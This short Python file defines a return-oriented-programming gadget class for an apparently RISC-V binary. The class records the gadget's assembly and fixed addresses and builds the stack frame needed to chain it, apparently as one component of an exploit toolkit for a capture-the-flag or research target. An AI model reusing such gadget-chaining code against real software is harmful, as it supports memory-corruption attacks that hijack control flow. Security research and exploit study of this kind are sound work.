from bf_parser.rop_gadgets_base_class import ROP_Gadget

class Beqz_s0(ROP_Gadget):
    '''
    beqz s0, 0x2290a
    ld a1, 0(s0)
    mv a0, s1
    mv s3, s0
    jalr s2

    0x2290a:
    ld ra, 0x28(sp)
    ld s0, 0x20(sp)
    li s3, 0
    ld s1, 0x18(sp)
    ld s2, 0x10(sp)
    mv a0, s3
    ld s3, 0x8(sp)
    addi sp, sp, 0x30
    jr ra
    '''

    def __init__(self):
        super().__init__(0x228ee, 0x30)

    def construct_frame(self, zero_sp, nonzero_sp, ra):
        data = [zero_sp, ra, 0, 0, nonzero_sp, ra]
        self.set_stack_frame(data)
        return self.print_gadget()